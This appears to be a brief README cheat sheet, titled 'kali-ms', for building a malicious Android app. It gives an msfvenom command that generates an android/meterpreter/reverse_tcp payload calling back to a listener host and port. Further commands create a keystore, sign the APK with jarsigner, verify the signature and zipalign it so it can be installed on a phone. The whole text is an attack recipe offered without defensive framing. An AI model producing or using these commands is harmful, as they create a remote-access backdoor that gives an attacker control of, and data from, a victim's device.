# kali-ms


msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 > reverse_tcp_.apk


## keytool

keytool -genkey -V -keystore key.keystore -alias krnick -keyalg RSA -keysize 2048 -validity 1000


## check your key content

keytool -list -keystore key.keystore

## Sign

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore reverse_tcp.apk krnick

## check signing

jarsigner -verify -verbose -certs reverse_tcp.apk

## optimization

echo "export PATH=\$PATH:~/Library/Android/sdk/build-tools/30.0.3/" >> ~/.profile && . ~/.profile

zipalign -v 4 reverse_tcp.apk singed_reverse_tcp.apk
